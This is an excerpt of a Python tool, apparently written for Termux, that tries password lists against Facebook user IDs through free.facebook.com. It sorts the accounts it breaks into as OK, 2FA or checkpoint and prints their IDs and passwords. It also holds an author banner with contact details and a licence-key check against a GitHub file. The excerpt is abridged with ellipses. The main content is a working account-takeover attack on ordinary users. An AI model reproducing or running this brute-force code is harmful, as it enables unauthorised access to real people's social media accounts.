...
ha = current.day
today = date.today()
SAMI2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
{BLUE}╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝
==============================
\033[1;31m  OWNER      :  SAFI
\033[1;31m  FACEBOOK   :  SAMI SAFI
\033[1;31m  GITHUB     :  SAMI ULLAH SAFI
\033[1;31m  WP NUMBER  :  03155929891
\033[1;91m=========================================================="""
...
def my_tool_security():
    ...
    print("\t  Fb page  : SAMI Hbf Cammands")
    print("\t  Github   : SAMI-king-06")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    if f_token in my_server:
        ...
        os.system("xdg-open https://https://www.facebook.com/profile.php?id=100069771695228")
        exit()
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_SAMI_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if SAMI in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/100069771695228");xyz()
    elif SAMI in ["4","04"]:
        os.system("xdg-open https://wa.me/923155929891")
        xyz()    
    elif SAMI in ["0","00"]:
       exit()
    else:
...
def password():
    ...
    linex()
    print("")
    passX = input(f" {RED}CHOOSE{SAMI2} : ")
    if passX in ['1','01']:
        os.system("xdg-open https://youtube.com/channel/UCXpGkHjd1nrSC43iZNTJ__Q/")
        password1()
    elif passX in ['2','02']:
        os.system("xdg-open https://www.facebook.com/groups/3327391490838490/")
        password2()
    elif passX in ['3','03']:
        os.system("xdg-open https://www.facebook.com/groups/3327391490838490/")
        password5()
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "method": 'POST',
           "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            "cache-control": 'no-cache',
            "pragma": 'no-cache',
            "referer": 'https://free.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="10", "Google Chrome";v="105", "Chromium";v="105"',
            "sec-ch-ua-mobile": '?0',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio SAMI_OK.mp3")
                print('\r\033[1;32m[SAMI-OK] '+uid+' [√] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio SAMI_2F.mp3")
                    print('\r\033[1;34m[SAMI-2F] '+uid+' [~] '+ps+' ')
                    ...
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio SAMI_CP.mp3")
                    print(f'\r\033[1;30m[SAMI-CP] '+uid+' [×] '+ps+ ' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SAMI 🔥] [%s] \33[1;97m[OK:%s{SAMI2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
...
def main_apv():
    ...
    print (logo)
    try:
        key1 = open('/data/data/com.termux/files/usr/bin/.SAMI', 'r').read()
    except IOError:
        os.system('clear')
        print (logo)
        
        print ('      THIS TOOL IS FREE ')
        print ('      CONTACT WITH ADMIN FOR APPROVAL')
        print ('      OR PAGE PA RABTA KRO THANKS')
        print ('')
        myid = uuid.uuid4().hex[:25]
        print ('         YOUR KEY : ' + myid + kk)
        kok = open('/data/data/com.termux/files/usr/bin/.SAMI', 'w')
        kok.write(myid + imt)
        kok.close()
        print ('')
        print ('      YA UPER WALE AP KE KEY HA')
        print ('      COPY KAR KA PAGR PA BHAJ DENA')
        print ('')
        print ('')
        print ('')
        os.system('xdg-open https://wa.me/923155929891')
    ...
    r1 = requests.get('https://raw.githubusercontent.com/Samiullahsafi678/random/d4152eb06683154e981060088547e46bc9624b11/Approval').text
    if key1 in r1:
        xyz()
    else:
        os.system('clear')
        ...
        print ('    AP KO APROVAL NHI HA PLEASE AP')
        print ('    ADMIN SA RABTA KRAN THANKS')
        print ('    APROVAL KELYA ENTER PRESS KRO')
        print ('    OR PAGE PA RABTA KRO THANKS')
        print ('')
        print ('   YOUR KEY  : ' + key1)
        print ('')
        print ('    YA UPER WALE AP KE KEY HA')
        print ('    COPY KAR KA PAGE PA BHAJ DENA')
        print ('')
        print ('')
